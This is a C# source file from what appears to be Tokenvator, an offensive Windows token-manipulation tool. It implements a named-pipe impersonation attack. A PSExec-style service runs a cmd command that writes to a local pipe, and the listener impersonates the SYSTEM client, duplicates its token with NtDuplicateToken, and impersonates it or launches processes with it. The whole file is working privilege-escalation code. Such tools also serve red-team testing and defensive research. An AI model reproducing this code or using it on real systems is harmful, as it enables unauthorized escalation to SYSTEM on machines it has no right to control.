using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace Tokenvator
{
    class NamedPipes
    {
        private static IntPtr hToken = IntPtr.Zero;
        private const String baseDirectory = @"\\.\pipe\";
        private static AutoResetEvent waitHandle = new AutoResetEvent(false);

        private delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments);

        internal NamedPipes()
        {
            
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal static void GetSystem()
        {
            Thread thread = new Thread(() => _GetPipeToken(@"\\.\pipe\Tokenvator"));

            using (PSExec psExec = new PSExec("Tokenvator"))
            {
                psExec.Connect(".");
                psExec.Create("%COMSPEC% /c echo tokenvator > \\\\.\\pipe\\Tokenvator");
                psExec.Open();
                thread.Start();
                waitHandle.WaitOne();
                psExec.Start();
                psExec.Stop();
            }
            
            thread.Join();

            if (IntPtr.Zero != hToken)
            {
                advapi32.ImpersonateLoggedOnUser(hToken);
                kernel32.CloseHandle(hToken);
                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                hToken = IntPtr.Zero;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal static void GetSystem(String command, String arguments)
        {
            Thread thread = new Thread(() => _GetPipeToken(@"\\.\pipe\Tokenvator"));

            using (PSExec psExec = new PSExec("Tokenvator"))
            {
                psExec.Connect(".");
                psExec.Create("%COMSPEC% /c echo tokenvator > \\\\.\\pipe\\Tokenvator");
                psExec.Open();
                thread.Start();
                waitHandle.WaitOne();
                psExec.Start();
                psExec.Stop();
            }

            thread.Join();

            Create createProcess;
            if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }
            createProcess(hToken, command, arguments);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetPipeToken(String pipeName)
        {
            Console.WriteLine("[*] Creating Listener Thread");
            Thread thread = new Thread(() => _GetPipeToken(pipeName));
            thread.Start();
            waitHandle.WaitOne();

            Console.WriteLine("[*] Joining Thread");
            thread.Join();
            Console.WriteLine("[*] Joined Thread");

            if (IntPtr.Zero != hToken)
            {
                advapi32.ImpersonateLoggedOnUser(hToken);

                kernel32.CloseHandle(hToken);
                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                hToken = IntPtr.Zero;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetPipeToken(String pipeName, String command)
        {
            Console.WriteLine("[*] Creating Listener Thread");
            Thread thread = new Thread(() => _GetPipeToken(pipeName));
            thread.Start();
            waitHandle.WaitOne();

            Console.WriteLine("[*] Joining Thread");
            thread.Join();
            Console.WriteLine("[*] Joined Thread");

            if (IntPtr.Zero != hToken)
            {
                Console.WriteLine("[*] CreateProcessWithLogonW");
                Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO();
                startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Winbase._STARTUPINFO));
                Winbase._PROCESS_INFORMATION processInformation = new Winbase._PROCESS_INFORMATION();
                if (!advapi32.CreateProcessWithLogonW(
                    "i", "j", "k",
                    Winbase.LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY,
                    command, command,
                    Winbase.CREATION_FLAGS.CREATE_DEFAULT_ERROR_MODE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    ref startupInfo,
                    out processInformation
                ))
                {
                    Tokens.GetWin32Error("CreateProcessWithLogonW");
                }
                else
                {
                    Console.WriteLine(" [+] Created process: {0}", processInformation.dwProcessId);
                    Console.WriteLine(" [+] Created thread:  {1}", processInformation.dwThreadId);
                }
                kernel32.CloseHandle(hToken);
                hToken = IntPtr.Zero;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static Boolean _GetPipeToken(String pipeName)
        {
            IntPtr hNamedPipe = IntPtr.Zero;
            try
            {
                hNamedPipe = kernel32.CreateNamedPipeA(pipeName, Winbase.OPEN_MODE.PIPE_ACCESS_DUPLEX, Winbase.PIPE_MODE.PIPE_TYPE_MESSAGE | Winbase.PIPE_MODE.PIPE_WAIT, 2, 0, 0, 0, IntPtr.Zero);
                if (IntPtr.Zero == hNamedPipe)
                {
                    Tokens.GetWin32Error("CreateNamedPipeA");
                    return false;
                }
                Console.WriteLine("[+] Created Pipe {0}", pipeName);
                waitHandle.Set();

                if (!kernel32.ConnectNamedPipe(hNamedPipe, IntPtr.Zero))
                {
                    Tokens.GetWin32Error("ConnectNamedPipe");
                    return false;
                }
                Console.WriteLine("[+] Connected to Pipe {0}", pipeName);


                Byte[] lpBuffer = new Byte[128];
                UInt32 lpNumberOfBytesRead = 0;
                if (!kernel32.ReadFile(hNamedPipe, lpBuffer, 1, ref lpNumberOfBytesRead, IntPtr.Zero))
                {
                    Tokens.GetWin32Error("ReadFile");
                    return false;
                }

                Console.WriteLine("[+] Read Pipe {0}", pipeName);

                if (!advapi32.ImpersonateNamedPipeClient(hNamedPipe))
                {
                    Tokens.GetWin32Error("ImpersonateNamedPipeClient");
                    return false;
                }
                Console.WriteLine("[+] Impersonated Pipe {0}", pipeName);

                Winbase._SECURITY_ATTRIBUTES sa = new Winbase._SECURITY_ATTRIBUTES();
                sa.bInheritHandle = false;
                sa.nLength = (UInt32)Marshal.SizeOf(sa);
                sa.lpSecurityDescriptor = (IntPtr)0;

                
                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), Constants.TOKEN_ALL_ACCESS, false, ref hToken))
                {
                    Tokens.GetWin32Error("OpenThreadToken");
                    return false;
                }
                Console.WriteLine("[+] Thread Token 0x{0}", hToken.ToString("X4"));
                
                IntPtr phNewToken = new IntPtr();
                UInt32 result = ntdll.NtDuplicateToken(hToken, Constants.TOKEN_ALL_ACCESS, IntPtr.Zero, true, Winnt._TOKEN_TYPE.TokenPrimary, ref phNewToken);
                if (IntPtr.Zero == phNewToken)
                {
                    result = ntdll.NtDuplicateToken(hToken, Constants.TOKEN_ALL_ACCESS, IntPtr.Zero, true, Winnt._TOKEN_TYPE.TokenImpersonation, ref phNewToken);
                    if (IntPtr.Zero == phNewToken)
                    {
                        Tokens.GetNtError("NtDuplicateToken", result);
                        return false;
                    }
                }

                if (IntPtr.Zero != phNewToken)
                {
                    hToken = phNewToken;
                }
                
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                if (IntPtr.Zero != hNamedPipe)
                {
                    kernel32.DisconnectNamedPipe(hNamedPipe);
                    kernel32.CloseHandle(hNamedPipe);
                }
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal static void EnumeratePipes()
        {
            String[] pipes = Directory.GetFiles(baseDirectory);
            foreach (String pipe in pipes)
            {
                Console.WriteLine(pipe);
            }
        }
    }
}
